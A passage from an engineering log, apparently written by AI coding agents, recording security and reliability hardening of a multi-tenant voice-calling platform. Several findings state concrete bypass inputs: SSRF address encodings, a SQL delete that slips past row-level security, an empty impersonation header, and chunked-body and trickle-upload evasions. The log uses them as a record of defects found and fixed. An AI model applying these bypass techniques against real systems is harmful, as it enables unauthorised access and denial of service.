denylist or grants table is needed.

**The untyped-2xx sweep ran a third time (D-84)** and its best decisions were refusals:
four acks returning a constant became 204 rather than models, because modelling a constant
satisfies both tools and teaches the next reader nothing; `/v1/numbers/purchase` became
`NoReturn` so that the day provisioning lands, mypy forces the author to declare a real
contract instead of inheriting a shape for a body that cannot exist.

**Two findings carried, both reported rather than quietly fixed:** there is no
compensating-adjustment endpoint, so `POST .../credits` refuses a negative amount with a
remediation pointing at a tool that does not exist; and `audit_chain_secret` falls back to
the guessable constant `local-dev:{app_env}` in EVERY environment including prod, so a
deploy that forgot it has an unverifiable audit chain.

## §64 — the two carried findings, closed; and a vendor re-examination that corrected us

§63 carried two findings rather than fixing them. Both are closed here, and the more
interesting half of the wave was neither: a question about the orchestrator produced a
correction to our own doc set.

**The audit chain's signing secret is now required, and the era it protected is
published (D-86).** The old fallback `local-dev:{app_env}` applied in EVERY environment,
so a prod deploy that forgot the variable signed an append-only ledger with a constant
printed in this repository — forgeable by anyone who can read the source, while the
console reported "chain intact". The fix that matters most is not the refusal but the
**shape** of it: one resolver, `resolve_hmac_key()`, now serves all three HMAC secrets,
and **a present-but-short key is refused with the same code as an absent one** — to a
caller they are one condition, and failing closed on absence while accepting a weak key
guards the easier half of a single mistake. The 32-byte floor is the strictest of three
converging authorities (RFC 2104 §3, NIST SP 800-107 Rev. 1 §5.3.4, RFC 7518 §3.2), cited
where it is enforced.

The consequence for existing deployments is the part worth remembering: history signed
with the old constant still has to verify, so `AUDIT_CHAIN_SECRET_RETIRED` verifies
(never signs) and `entries_under_retired_key` publishes how much of the log rests on it.
**That count is deliberately not a component of `ok`** — those rows are intact; what they
lack is attestation STRENGTH, which matters at exactly one moment (exporting the log as
evidence) and is therefore rendered beside both verdicts rather than left in a runbook.

**Credit adjustments exist (D-87)**, and the design question was the idempotency key. A
caller-minted key was rejected because the failure being defended against is a SECOND
CLICK, which mints a second key; the key is content-addressed on `(entry, amount)` and
enforced by an index that already existed, not by a reader's `if`. The cost is written
where a reader will meet it: two genuinely distinct corrections of the same amount
against one entry collapse, and the second reads as "already corrected, nothing moved" —
the safe direction when money is leaving. The balance is allowed to go negative because
the alternative is a ledger that permanently claims credit the client never had; and
because that must not be silent, `stops_dialling` carries the dial gate's own predicate
evaluated inside the write's transaction rather than a second copy of the rule.

**The vendor question corrected our documentation, which is the part to carry
forward (D-88).** Asked why Bolna over Cartesia, the honest answer required reading
Cartesia rather than repeating our teardown — and the teardown was stale. Cartesia Line's
LLM is fully BYOK (LiteLLM, 100+ providers); its **STT and TTS are not** — Ink 2 and
Sonic 3.5 have no swap interface, from Cartesia's own SDK README. So Line cannot host
D-36's Sarvam stack, and its $0.06/min is a bundled rate that was never comparable to a
BYOK platform fee. Meanwhile our "English-first TTS" characterisation was simply false by
Aug 2026: Sonic 3 covers the top 9 Indic languages including Telugu, and the Blue
Machines partnership targets India-**resident** processing. D-31's conclusion survives —
on **telephony**, not price, since none of Line's number paths yields a DLT-registered
Indian number — but its stated reason did not, and a stale rationale is how a settled
decision gets re-litigated badly.

Two numbers came out of that work and both are now in TRD §10.4: **Bolna's BYOK platform
fee is observed at 2¢/min ≈ ₹1.76**, which is inside §10's assumed band but ~17% above
gate 12's ≤₹1.50 target (worth ₹5,200/month at 20k platform-minutes); and **the larger
cost lever is Bulbul v2 vs v3** — ₹13,400/month at the same volume, bigger than the whole
platform-fee gap, and decided by a Telugu ear test rather than a rate card.

## §65 — nine red CI runs from borrowed credentials, a drain that had never drained, and two guards pointed at the doc set

The wave's largest finding was not in a feature. **`_install_signal_handlers` destroyed
the drain its own docstring described (D-101).** `Server.serve()` enters uvicorn's
`capture_signals()` and *then* runs the lifespan, so our handler replaced `handle_exit`
with one raising `KeyboardInterrupt`; the exception escaped `asyncio.run`, so
`Server.shutdown()` never closed sockets and never waited, and the lifespan's `finally`
never flushed. Measured with a real server and a sleeping request — before, `ESCAPED
KeyboardInterrupt` and no in-flight line at all; after, `INFLIGHT 200` then exit 143. On
`hooks.calevate.tech` that made every deploy an abort of whatever webhook was in flight,
on an at-most-once feed with no retry (D-31), and `stop_grace_period: 30s` had nothing to
give its seconds to. DEPLOYMENT §4b's promise is true for the first time.

**Nine consecutive CI runs were red on two tests that asserted about an environment they
had borrowed rather than declared**, and because every guardrail is a later step in the
same job, all twelve were reported `skipped` for those nine commits — which is the part
worth carrying: `skipped` was read as `ok` here, by me, in a readiness audit. One test
proved secret precedence using `COHERE_API_KEY` because this repo's `.env` happened to
carry it; the other needed botocore to find an access key and found the developer's
exported `AWS_*`. The individual fixes are small. What closes the CLASS is
`tests/conftest._no_ambient_credentials`, which strips `AWS_*` and repoints `HOME` for the
whole session, so borrowing is impossible rather than detectable — a test that needs a
credential now declares it, which puts the dependency in the test that has it. **The
grep-shaped guard written first was thrown away**: it flagged three files that merely NAME
a credential inside an assertion and caught neither real offender, and a check that
produces only false positives is worse than none. Two structural facts keep local and CI
the same shape and are asserted: no committed `.env`, and `.env.example` held to the eight
bootstrap keys.

Also closed: **ARQ jobs now pin `Settings` for their duration** via `on_job_start` /
`on_job_end`, the half left open when D-101's `settings_scope()` landed in both HTTP
deployables. Jobs are the half that runs LONGEST — a post-call pipeline can be alive for
many seconds while a console change propagates in ~5 — and a job that reads
`usd_inr_rate` when it prices a call and again when it writes the usage row could bill one
call at two rates, in an append-only ledger where the fix is a compensating entry. And the
graceful-shutdown timeouts in `compose.prod.yml` are now stated with their arithmetic
rather than left to a default that outlives `stop_grace_period`.

**Two guards were pointed at the doc set, in opposite directions.** D-102 gives the
greppable-constant device its reverse check: prose that STATES a capability constant's
value is compared against the AST-discovered constant, because every error the readiness
audit found ran the same way — the capability was BUILT and the doc still said missing.
`PROVIDER_CREATES_ORDERS` had been True since D-98 while four documents said no checkout
could be opened. Understating is not the safe error: it is how a shipped checkout gets
rebuilt, and `docs/` is authoritative, so a reader believes the doc over the code.
Value-stating rather than name-mentioning, adjacency rather than proximity, present tense
only — 20 value-statements in the tree, 4 genuine offenders, 0 false positives.

D-103 points the other way, at code. **The set of engine names had three spellings**, and
the drifted copy in the voice-runtime receiver did not open a hole — Cartesia deliveries
were already refused twice over — it created a BLIND SPOT: `_refuse` labels anything
outside `KNOWN_ENGINES` as `"unknown"`, so on `ENGINE=cartesia` every 401 was attributed
to a stranger probing the URL rather than to our own unimplemented verifier. The set now
has exactly two definitions, both in `calevate_shared`, and an AST scan fails the build on
a third rather than pinning the two we found. That matters because **the third copy is the
one nobody looked for**: `agents/models.py::ENGINES` renders a CHECK constraint, so
`ENGINE=cartesia` fails client creation with a raw `IntegrityError`. It needs a migration,
so it is reported as a strict `xfail` and an equality-asserted `KNOWN_OPEN_COPIES` entry —
fixing the constant fails the test and forces the entry's deletion, so the list cannot rot
into a permanent exemption.

**D-104 closed both defects D-103 reported and could not fix**, and they turned out to
share a root: a fact about a vendor written down outside `apps/api/engine/`. The CHECK
constraint was the worse one, because a constraint is not advisory — on `ENGINE=cartesia`
the first thing a new client did, exist, failed with an `IntegrityError` naming a
constraint whose text disagreed with the setting that produced the value. The second was
quieter and reaches further: `/healthz/ready` named `BOLNA_API_KEY` under one hardcoded
vendor clause, so a credential-less Cartesia box reported itself fit for traffic on the
probe an orchestrator uses to decide whether to send it any. The obvious patch — a second
`if` — is the shape that produced the bug, so the adapter now answers both halves:
`holds_credentials()` for the verdict and a new `credential_env_keys` for the NAME,
because "not ready" without the key to set is a red light with no next step. Two things
that had to exist before the fix was correct: `build_engine`, split out of `get_engine`
because the cache is keyed on engine NAME and would answer readiness about a configuration
that is not deployed; and a test that reads `pg_get_constraintdef`, because `ENGINES`
deriving from `SELECTABLE_ENGINES` makes model and database agree in PYTHON while the
database keeps whatever the last migration wrote. Sabotaging the live constraint behind
the model's back is red on that test alone.

**The constant-with-no-home class claimed a third victim, and this one was pointed at a
vendor (D-105).** `"sarvam-m"` was a literal in two places — the post-call extractor and
the pilot gate's agent config — and Sarvam has RETIRED that identifier: a Chat Completions
request naming it fails. So extraction was aimed at a model that no longer answers, and
pilot gate 1 would have configured a real agent on a real telephone number with a dead
LLM. TRD §10 has priced the LLM leg at ₹0.00 on "Sarvam 105B, free per token" since D-36,
so the code and the unit economics disagreed about which model was running, on the one leg
whose entire contribution is that it costs nothing. `sarvam-30b` is in the retired set too
— it was `sarvam-m`'s own migration target — which is the detail that argues for keeping
the set rather than just correcting the string. Evidence is REPORTED, NOT READ and says so
at the constant: `docs.sarvam.ai` is egress-blocked here.

**A test that had never run failed the first time it ran (D-106).** `object_lifecycle_test`
guards the policy that deletes recording AUDIO — the only retention mechanism that touches
bytes rather than pointers — and its store-backed check is gated on `localhost:9000` being
reachable. MinIO was down on every previous run and CI declares no MinIO service, so "1
skipped" was the line nobody read. Restarting the container for an unrelated reason ran it,
and MinIO rejected the policy. **The cause is a documented MinIO limitation, not a bad
policy** — `AbortIncompleteMultipartUpload` is unsupported in its `PutBucketLifecycle`,
while R2 (production, DEPLOYMENT §1) implements it — so `policy.json` is unchanged and the
test's CLAIM changed instead. The finding that outranks the failure is the silent one: fold
that action into a rule MinIO CAN implement and it answers 200 and discards the action.
That is the obvious way to make the red test go away, and it yields a green suite and a
policy where the growth control does not exist; it is now pinned. Two more things fell out:
`apply_lifecycle._client` used boto3's process-global `DEFAULT_SESSION`, so the first
caller anywhere in the process fixed the credentials every later caller signed with — which
made the three checks pass alone and fail in the suite with `InvalidAccessKeyId` — and CI
now starts MinIO as a step, because a guard that skips everywhere is not a guard.

**A doctrine landed in CLAUDE.md and AGENTS.md rather than a file**: there is no "later".
Work that can be done now is done now, and the only scheduling distinction that survives
is whether a thing is ours to do or waits on someone else — a credential, a regulator, a
vendor reply. It does not license shortcuts; it forbids narrating a schedule instead of
finishing a seam.

## §66 — four slices in parallel, and the two findings that came from disbelieving the brief

Four agents ran concurrently on disjoint modules. The two most valuable results are both
cases where the work contradicted the instruction it was given.

**The national-DND brief was wrong, and the research is what changed the design (D-107).**
I specified a loader for a list of tens of millions of numbers. The NCPR **cannot be
downloaded** — every access provider's DLT documentation carries the same sentence, that
the preference database is not accessible to telemarketers — and the real mechanism is
that a Registered Telemarketer SUBMITS a list and receives back a reference, a report of
COUNTS rather than numbers, and a verdict valid until 23:59:59 that day. So the right
primitive is a RUN with an expiry, not a list. Loading NCPR rows into `dnc_list` was
rejected for a second reason that outranks the first: preference is category-scoped, so
`check_dispatch` would read those rows as absolute and refuse **lawful transactional**
traffic — wrong rather than conservative. The gate is therefore promotional-only, lives on
the dispatch tick as well as launch (the window closes at midnight IST while a campaign
keeps dialling), and is not a self-inflicted outage because performing a scrub needs the
same RTM relationship that `tm_registration_missing` already demands.

**The poller was not the guarantee of record (D-110).** D-31 says it is. Measured: when a
delivery arrived and the post-call job was then lost, ten consecutive ticks reported
`repaired=0` with artefacts still 0,0,0,0 — no lead, no transcript, no usage row, no bill,
unrecoverable, because `_already_completed` asked only whether a completed call row
existed and `ingest_engine_event` writes that row *before* enqueueing the pipeline. The
fix needed no migration: the engine's own snapshot says whether the execution had a
transcript and a cost, so an absence stops being ambiguous — strictly stronger than the
`calls.pipeline_completed_at` marker first considered, since a stage marker claims "the
pipeline ran" and a run that silently produced nothing satisfies it. The same slice found
a genuinely concurrent post-call pair writing **10 usage rows for a 5-call** and counting
1.5833 minutes as 3.1666 — permanent, because the ledger is append-only, and a spend cap
armed at half the tenant's real allowance.

**A security defect fell out of obeying the ratchet rather than out of review (D-111).**
D-107 pushed `compliance-gate` from 9 uncovered units to 21, and D-29 says that number
only shrinks. Covering `remove_global_entry`'s "RLS refused the delete" branch meant
building a tenant session that could see a global row but not delete it — and the test
would not go red, because the delete SUCCEEDED. `SET app.tenant_id = '…'; DELETE FROM
dnc_list …` → **`DELETE 1`**: any client could lift a regulator instruction binding every
other client. The cause is a Postgres semantic that is easy to read past — `USING` alone
decides which rows a DELETE may remove, while `WITH CHECK` covers INSERT and an UPDATE's
new row — so an asymmetric policy that deliberately opens `USING` to `tenant_id IS NULL`,
which D-107 had to, opens DELETE with it. UPDATE was checked rather than assumed and is
correctly refused. **The application guard was not the fix and could not have been**: the
`rowcount != 1` refusal was written believing RLS refused the delete, and D-107's own
sabotage reported it "redundant" on the strength of the SELECT's behaviour — right about
the SELECT, wrong about the DELETE.

**Money (D-108).** `_unit_price` — the write path for `usage_events.unit_cost_paid` —
quantized on the mutable process-global `decimal` context, so a ₹0.0180 telephony leg over
a 360-second call, exactly ₹0.00005/second, stored as `0.0000` and left the margin panel
and the month's `spend_used` entirely. And `states_pricing` read a hand-written price list
that `overage_rate_value` was never added to, so a plan quoting only the value rate — the
row a founder writes the day that price is decided — rendered as "No price agreed … They
are still invoiced nothing" over a plan billing ₹5.50/min.

**The 100ms budget is measured (D-109)**, for the first time since `CLAUDE.md` asked. p95
1.4ms at one call in flight with zero database round trips; but flat under concurrency, so
the whole budget is spent at ~175 concurrent in-flight tool calls per process. It is a
process-count question, not a handler question.

**On method.** Sabotage found defects in the agents' OWN tests in three of the four slices:
an `is` comparison on an interned `decimal` constant that could not fail; a concurrency
test whose race was being run by a different lock four stages earlier; an `assert x == 0`
against a counter nothing incremented; a fixture with equal counts on both sides. Every one
of those tests looked correct and proved nothing. The protocol also caught a reversibility
bug in D-107's migration — the downgrade dropped a trigger but not its function, so
`downgrade`→`upgrade` failed `DuplicateFunction`, and a downgrade that cannot be followed
by an upgrade is not reversible.

## §67 — the deep hardening wave on one path: a founder signs a client, that client's agent goes live

A readiness audit scored this repo 6/10 for a first supervised test call and 3/10 for a
paying client #1. The second number is the whole of the path from an operator opening the
admin console to a dialable agent, minus the parts that are not ours (a legal entity, a
DLT registration, a vendor account, a signed commercial term). Three agents took one
segment each — the credential that crosses the realm boundary, the birth of the tenant,
and the meaning of the word "live" — and the wave is worth reading for a pattern the three
findings share rather than for its line count.

**Every one of the three found the same shape: a claim the code made about the world,
derived from a fact about ourselves.**

- `Principal.impersonating` was read by every mutating dependency as "a grant was
  verified and this read was audited". `X-Impersonate-Org:` with an EMPTY value satisfied
  `header is not None`, so the flag went true while the falsy slug skipped the permission
  check, the grant requirement and the audit row (D-119).
- The wizard reported `status: live` and wrote the routing row for an agent with no
  script, publishing a hardcoded `"You are a helpful receptionist."` — nine words of
  English with no hours, no prices and no business name, on a Telugu clinic's line
  (D-118, carried into this wave's tests).
- `publish_agent` never called `get_agent`. `status='live'`, `engine_agent_ref`,
  `live_prompt_id` and `live_tts_voice` were four assertions about the vendor derived
  from one fact about us: our HTTP call returned without raising. D-64 had built the
  entire read-back surface — `carries_prompt_marker`, `holds_speech`, three `*_readable`
  tri-states — and nothing in production ever called any of it (D-121).

**The most instructive defect is the one two copies of a typo made invisible.**
`permission_meta("agents:reed")` beside `requires("agents:reed")` satisfies every check
this repo had, because declared equals enforced and an identity resolves. `role_has` then
answers False for every role the database enums allow, so the route is a 403 for the
entire population — a dead endpoint that reads as a guarded one, with no happy-path test
to go red. mypy catches the literal spelling, but it does not run at boot, cannot see a
permission built from a variable, and never looks at the route table. The registry now
validates every declared string against `get_args(Permission)` and against
`GRANTED_PERMISSIONS`, and the mutation sweep drives all 66 mutating routes with a real
minted grant, each required to refuse with one of exactly two known codes.

**A Telugu-first product folded Telugu to the empty string.** `slugify` returned `""` for
any non-Latin name and a constant was substituted, so the FIRST such client silently took
the immutable slug `client` and the second was refused `slug_taken` naming a slug nobody
had typed. That is the DEFAULT path for this market, not an edge case. Transliteration was
rejected for a stated reason rather than an aesthetic one — no ASCII-folding library is
installed and adding one to the tenant-birth path is a hard-rule-9 supply-chain decision —
so the product asks, on both screens, before the POST (D-120).

**Concurrency turned an ordinary case into the orphan.** `publish_agent` was a
read-then-write over `engine_agent_ref` with a vendor round trip in the middle and no
lock: two concurrent publishes both saw "no ref", both created, and one vendor agent
became unaddressable and undeletable. Proving it needed a double that mints a fresh id per
create — FakeEngine's deterministic ref hides the bug entirely — plus 50ms of vendor
latency, because `asyncio.gather` with no yield inside the vendor window runs each
transaction in turn and measures nothing. That sabotage was GREEN first time and the test
was wrong, not the code.

**On method, and one flake worth naming.** Twenty-three sabotages across the three slices,
each verified landed by grep with a green baseline asserted either side; two of them could
not be made red from application code at all and are recorded as DATABASE-enforced
guarantees rather than dropped, because `calevate_app` is NOBYPASSRLS and cannot `SET
ROLE`. Separately, `tests/prompt_experiment_test.py` carried a **once-in-a-thousand-runs**
failure that had nothing to do with this wave and everything to do with how it read: it
completed "the ten lowest numbers" and asserted arm A's rate was 1.0, but which arm a
number lands in is salted by the EXPERIMENT ID, which is fresh every run. Measured over
200,000 synthetic salts, arm A is empty in that slice 0.093% of the time, and `rate` over
zero completed calls is `None` by design — so the failure arrived as an arithmetic-looking
assertion in a suite of 3,631 tests, with the test passing every time it was re-run alone.
It now chooses the completed calls FROM THE RECORDED ASSIGNMENTS, half of each arm. A test
whose fixture depends on a random salt is not deterministic because it looks deterministic.

## §68 — the plan, then seventeen of its eighteen parts, and what an adversary found afterwards

Two audits, a written plan, then the work. `docs/PLAN-HARDENING-AND-GEMINI.md` was produced
first at the founder's instruction, from two mechanical read-only sweeps — 176 backend
routes enumerated three independent ways (the live FastAPI table via `iter_api_routes`, the
generated `openapi.json`, `check_wiring`) and 46 frontend route files with all 77 query
hooks checked for an unread `isError`. Parts 1–16 and 18 then landed as D-127…D-138. Part
17 is pilot-gated and stayed unbuilt.

**The plan was wrong in four places, and each correction is worth more than the part it
came from.**

- **The census was wrong twice.** "27 untested routes" was 21 — and the agent that found
  that also caught its OWN first answer of 24, because its matcher could not see a quoted
  key inside an f-string hole. **`_request_ip` was 1 of 83** `request.client.host` call
  sites, so SEC-COMP §5's `ip` field is satisfied in shape only across ~30 files rather
  than at the one dependency the audit named.
- **"Maintenance mode still admits new tenants" was false.** `signup.py` already refuses
  every non-normal mode. The defect was real but structural — an exemption aimed at a route
  that does not exist, with a second copy of the rule in the route covering for it — and it
  shipped as a census rather than a behaviour patch, which is why nothing was red.
- **The nginx origin lock was not the alternative the plan offered.** It admits every
  Cloudflare edge range, i.e. the whole internet on a proxied zone; `/healthz/ready` was
  already behind it, which is precisely why it leaked.
- **`google-auth` was declined on better grounds than the ones considered.** The lockfile
  diff was clean; the objections were that this repo already implements the RFC 7523
  JWT-bearer flow in `google_sheets.py`, and that `google-auth`'s `refresh()` is synchronous
  over `requests`, which would block an arq event loop. The flow was extracted to
  `google_oauth.py` and Sheets migrated onto it in the same change — **net lockfile diff:
  two lines, zero new packages.**

**The single most valuable result is a measurement, not a fix.** The adversarial pass drove
34 client routes with a neighbouring tenant's REAL row ids and a valid session: every one
answered 404, none 403, none 2xx. Then it set `ALTER ROLE calevate_app BYPASSRLS` and ran
the identical sweep — **29 routes leak at once**, including DELETE of a neighbour's lead
source, webhook endpoint and members. Tenant isolation in this product is the database's
and nothing else's. That is now a known quantity rather than a belief.

**Three defects it found were all the same shape: a control that declared a number the
caller could change.** `verify_token` called PyJWT's `get_signing_key_from_jwt` — a
SYNCHRONOUS `urlopen` with a 30-second default — on the event loop, refetching on an unknown
`kid` without memoising the failure, reachable by any anonymous caller varying one field of
an unsigned JWT (measured: 1 heartbeat tick completed during the request, ≥10 after). The
rate limiter keyed on the raw `Authorization` header, so `Bearer x`, `bearer x` and
`Bearer  x` were three buckets for one credential — unbounded with whitespace. And
`BodyLimitMiddleware` read only `Content-Length`, so `Transfer-Encoding: chunked` walked
past the 2 MiB cap; the "nginx backstops it" comment that made nobody worry was **false**,
the edge allows 25m.

**On SSRF, the guard is worth reading as a piece of design.** It judges resolved addresses
rather than strings, which is why `http://2130706433/`, `0177.0.0.1` and `0x7f000001` are
refused with no special case — glibc parses them the way the connection would. It *measured*
that `is_global` alone is insufficient on this interpreter (`239.1.1.1` and `ff02::1` both
report True), and the sabotage that reduced the check to `is_global` came back DID NOT
RAISE. It re-vets after DNS at connect time, because registration-time DNS can be rebound.
And when the suite's reserved-name fixtures would all have failed closed, it substituted the
RESOLVER seam in `conftest` rather than exempting reserved names inside the shipped guard —
naming that alternative as the "bypass for testing" hard rule 5 forbids in those words. The
pass then found the one path the guard did not cover: `copy_recording` fetched a
VENDOR-supplied URL with `follow_redirects=True` and no check at all (D-138).

**Two agents split a question the plan posed as either/or, and were right to.** Six
curl-only compliance routes did not need one answer: the global-DNC surface got screens
(nothing external blocks the act, and a runbook had an operator hand-assembling a POST with
a step-up header against production while answering a regulator), the WhatsApp opt-in got
screens (those routes were DESIGNED around a console that did not exist — the response
carries the notice text and version precisely so a screen can render what a client agrees
to, and **an operator cannot give a client's consent**), and the preference scrub stayed
curl-only because it records a run on a DLT platform requiring an RTM relationship Calevate
does not hold.

**On method, the pattern held and sharpened.** Agents self-reported tests that passed for
the wrong reason in seven of the ten slices — a per-field scorecard whose tests built their
own inputs and so never exercised the classifier feeding it; a `surfaceStatesGuard` sabotage
that passed because the fixture's branch held a `<p>` where the rule looks for a control; a
log assertion reading the `LogRecord` attribute instead of the formatter's output, which
would have passed for a line shipping `[1 items]` instead of credential names. One agent
found its own tests were order-dependent only by running each suite eight times in a minute
rather than once. **The frontend guard's rejected heuristic was revisited and adopted**: its
own history recorded measuring "does anything read this query's error?" at 22 hits/~20
correct and rejecting it as an unfixable treadmill — the insight this wave was that *the
treadmill was a property of the backlog, not the rule*. Re-measured at 9 hits, 9 real, all
fixed, and `EXEMPT` is now empty.

**The ratchet did its job twice at integration.** It refused a coverage suppression that was
argued rather than sneaked (a `pragma: no cover` on a genuinely unreachable branch — replaced
with `.one()`, which deletes the branch instead of hiding it), and then it found that the AI
quota gate's **success path was untested**: every refusal was proved and the branch that says
"yes" was not, in a file whose natural bias is ceilings.

## §69 — five batches re-attack the subsystems the last two waves never reached

§67 hardened one path end to end and §68 hardened eighteen parts of the plan. Neither
went near the post-call pipeline, the campaign dispatcher, the voice-runtime receiver,
the migration chain or the rupee path as *subsystems* — they were touched only where the
slice under attack crossed them. Five batches took one each, with instructions to attack
the guarantee rather than the code, and every one of them found something.

**The five findings that would have cost real money or real law.**

- **`TRUNCATE` emptied every append-only ledger and no guard noticed** (hard rule 4). A
  `FOR EACH ROW` trigger has no rows to fire per on TRUNCATE, and
  `check_ledger_immutability` only ever asked about UPDATE and DELETE. `TRUNCATE calls
  CASCADE` reached `usage_events` and `consent_ledger` sideways. Worse and quieter:
  every trigger was `ENABLE ORIGIN`, so `SET session_replication_role = replica`
  switched all eight off — and that is exactly what `pg_restore --disable-triggers`
  emits. Both closed by `a2e9f31c605d` (statement-level `BEFORE TRUNCATE` triggers,
  `ENABLE ALWAYS` on all of them) and the guard now requires both properties.
- **A tenant could rewrite another tenant's inbound route** (hard rule 1).
  `engine_agent_routes` is RLS-exempt for a reason recorded entirely in terms of
  READING — a webhook arrives with only the vendor agent id — and the table had no RLS
  at all, so a session scoped to tenant A could `UPDATE ... SET tenant_id = A WHERE
  tenant_id = B` and re-point another client's inbound calls at its own agent. This is
  the same shape `e4f2a86b13d7` already fixed once on `dnc_list`; the second table with
  it never got the same treatment. `c4b70e928a1f` splits the read from the writes.
- **Double quantization put a wrong number on an invoice.** A line read `5.00 min at
  ₹3.75/min — ₹18.69`, because every surface in `billing/service.py` published a
  breakdown and a total that were rounded independently. Fixed with largest-remainder
  apportionment (`allocate_paise`), which is what invoicing systems that must split a
  total across lines converge on. The rejected alternative is in its docstring: deriving
  the last part by subtraction is correct for two parts and returns **-0.01** for three.
- **A `no_consent` dial was not in the dispatcher's terminal set**, so it re-claimed and
  refunded every 30 minutes forever and the campaign never completed. Alongside it: a
  pause mid-batch did not stop dials #2 and #3, and a campaign narrowed to 09:00–12:00
  dialled at 12:05.
- **The webhook receiver's body read had no time bound.** `_read_bounded` bounded bytes;
  nginx's `client_body_timeout` bounds the gap between reads, not the total. A 7-chunk
  trickle was measured returning **202 with `X-Ack-Ms: 1506`** — hard rule 3's budget
  blown by a client controlling its own upload speed. And an uncaught `ClientDisconnect`
  raised `unhandled_exception`, which `_admit` then suppresses for 15 minutes: one
  half-open POST per quarter hour silenced the receiver's real crash alarm.

**Two batches did the third thing rather than the thing they were asked to do, and both
were right to.** The voice-runtime batch was challenged for changing the Redis dedupe key
from `{engine}:{execution}:{body-hash}` to `{engine}:{execution}:{status}` — on an
unsigned engine the body hash is part of the only authenticity control we have. Its answer
was to measure rather than argue: against a pristine `git show HEAD:` copy of the service,
a doctored re-delivery produced **zero alerts and an unchanged `payload_hash`** under both
keys, because the hash the receiver hands the inbox is a pure function of the key. The
"doctored replay ⇒ 409" branch was a tautology that could never fire. So the key is the
transition and its *value* is the body digest: a hit whose bytes differ now increments a
counter, Postgres is still untouched, and the assertion is stronger than the one it
replaced. The money batch was told to make the parts add up and instead asked what
"adding up" means when one surface prices at supplier cost and another at the runway rate
— which is how the two commercial questions below got asked at all.

**Three of this session's defects were the SAME defect: prose that trips its own guard.**
`check_model_residency`, `check_audit_ip` and `check_docs_drift` each grew a docstring
containing the exact token the checker bans, and a fourth instance put a literal
`# pragma: no cover` inside a comment explaining why not to use one — `coverage`'s
`exclude_lines` is a regex over source lines, so it excluded the very function the comment
justified. The `check_docs_drift` case is the sharpest: a `_highest()` helper defaulted to
a zeroth-decision sentinel, the file is itself scanned for citations, and the checker
reported **itself**. The fix is the one that generalises — return `None` and let the
message degrade to prose — because splicing the string so the pattern misses it hides the
literal from the guard instead of removing it, which is the move the whole file exists to
catch. `tests/docs_drift_guard_test.py` now pins both halves and writes neither number out.

**The ratchet stopped charging for something nobody chose, and started being obeyed** (D-152). It
refused this wave over four "uncovered units" in `apps/voice-runtime/webhook_routes.py`
that turned out to be a four-line `Protocol` declaration: coverage 7 excludes `...`-bodied
stubs and `if TYPE_CHECKING:` blocks BY DEFAULT and sweeps the blank lines around each
excluded clause in with them, and the ratchet counted the lot as author suppression under
a message naming a pragma the file did not contain. Three of the four were whitespace. A
guard that charges for the repo's own typing idiom — the shape `VoiceEngine` itself is
written in — teaches authors to reach for untyped callables, which is the opposite of what
it is for. It now counts only lines that carry the comment, read from the source; the
doctrine ("a suppression is not an escape") is unchanged and the new tests measure
coverage's actual defaults from a real run rather than trusting a changelog.

Sharpening it dropped two areas below their floors, and the four remaining suppressions in
guarded surfaces were then **removed rather than accepted**: two were `.first()` followed by
an unreachable `row is None` and became `.one()`, which deletes the branch instead of hiding
it; one was an opt-out validation labelled "programmer error" — a description of who causes
it, not of whether it can be driven, and it took one call; one was a post-CAS re-read that is
now driven directly. **Seven no-cover comments remain outside the guarded areas** (in
`admin/routes.py`, `ops/config_service.py`, `agents/verification.py`, `campaigns/service.py`,
`campaigns/scheduling.py` and two in `reliability/service.py`). They are not charged by any
area today and they were not swept: the two in `reliability/service.py` guard real TTL races
rather than impossibilities, and a sweep that treated them like the mechanical four would be
the "argued rather than sneaked" suppression in reverse.

**Two things were fixed that were reported rather than fixed by the batch that found them.**
`tier_usage` — the three-rung TTS cost split D-36 asks for — had no caller outside the test
suite for two waves. It is now nested under `tiers` on `GET /v1/admin/tenants/{id}/margin`,
where it partitions the `cost_inr` on the same card and needs no second round trip, and the
admin panel renders it. That surfaced a second defect on the way: five web fixtures carried
`as Margin`, so `pnpm -C apps/web typecheck` stayed green while every one was missing a required
field and the panel threw at runtime in 25 tests. The casts are gone; the compiler is the
thing that notices the next added field.

**A `git checkout` on one file cost 262 lines of another batch's uncommitted work**, and
the only reason nothing was lost is that a `cp` taken two commands earlier for the sabotage
protocol happened to hold the full state. This is the rule already given to every subagent
— never `git stash`, `git checkout --`, or `reset --hard` — and it applies to the
coordinator identically. The sabotage protocol's restore step is `cp` from the backup, not
a git operation, precisely because git restores from HEAD and knows nothing about what else
is in the working tree.

## §70 — recordings, key moments, KB drift, and the twenty failures that were not failures

Three feature slices and one investigation. The investigation is first because it changes
how much the other three are worth believing.

**"20 pre-existing failures" was a description, not a diagnosis.** A hardening agent's
final run reported `4328 passed / 20 pre-existing failures` and moved on. Nobody had ever
named them. They were three clusters — 15 in `platform_secrets_test`, 3 in
`rls_sweep_test`, 2 in `dnc_test` — and **all 20 pass on a quiet box**: a single
uncontended run scored 4511 passed, 0 failed. Every one of the three files is a
whole-table sweep over shared un-tenanted state (`rls_sweep_test` enumerates EVERY tenant
table; `dnc_list` and `platform_secrets` are global), `pytest-xdist` is not installed so
the suite is serial and the interference cannot be intra-run, and `platform_secrets_test`
says in its own docstring that its table is shared. Five concurrent agents were pointed at
one database. This matters beyond the bookkeeping because three of the twenty are hard
rule 1 in executable form, and a standing count of unexplained red is how a real tenancy
break would have been waved through as "one of the usual twenty".

**Running the suite SCOPED is how a guard goes unseen.** The KB drift agent ran 282 tests
across 16 KB-related suites, reported green, and the coordinator pushed on that. The first
whole-suite run afterwards found two failures, both belonging to that commit:

- `kb_boundaries_test` scans every file under `apps/api/kb/` AS TEXT for vendor vocabulary
  (hard rule 2). The new `kb/reconciliation.py` named the vendor four times and its
  account-listing endpoint once — all in prose. This is the "prose defeats its own guard"
  class for the sixth time this session, but here **the guard was right and the prose was
  wrong twice**: the module is engine-agnostic (it drives off
  `capabilities.has("knowledge_base")`), so a vendor name in it was inaccurate as well as
  a rule-2 leak, and `kb/service.py` had been describing the same mechanics without naming
  anyone. Reworded. Making the scan comment-aware was the easy fix and is forbidden —
  weakening a guard to pass a test — and the rewrite reads better regardless.
- `tm_registration_test`'s EXACT-SET assertion on `GET /v1/ops/platform` caught `kb_drift`
  arriving. Third time that assertion has earned itself; its own comment already records
  `outbox_dead_letters` and `engine_drift` landing the same way.

**Call recordings became listenable, and the link stopped expiring mid-audio** (D-153).
Every presigned link was signed for 300s against a `CALL_CAP_MAX_S` of 3600, so a
twenty-minute call played for five minutes and stopped — and S3 answers an expired
signature with XML that a browser surfaces as a bare `MEDIA_ERR_NETWORK`, so the owner's
